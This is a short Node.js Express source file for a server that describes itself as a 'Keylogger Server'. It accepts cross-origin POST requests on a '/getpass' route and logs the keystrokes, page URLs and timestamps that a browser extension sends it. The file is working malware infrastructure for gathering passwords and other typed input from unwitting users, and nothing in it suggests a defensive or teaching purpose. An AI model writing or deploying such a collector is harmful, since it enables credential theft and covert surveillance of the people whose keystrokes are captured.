const express = require('express');
const cors = require('cors');
const app = express();
const port = 3000;

// Middleware to parse JSON request bodies
app.use(cors()); // Allow all origins
app.use(express.json());

// Define a GET route for the root URL
app.get('/', (req, res) => {
  res.send('Welcome to the Keylogger Server!');
});

// Endpoint to handle keystroke data
app.post('/getpass', (req, res) => {
  const { key, url, timestamp } = req.body;
  console.log(`Keystroke: ${key}, URL: ${url}, Timestamp: ${timestamp}`);
  res.sendStatus(200); // Respond to the extension with a success status
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
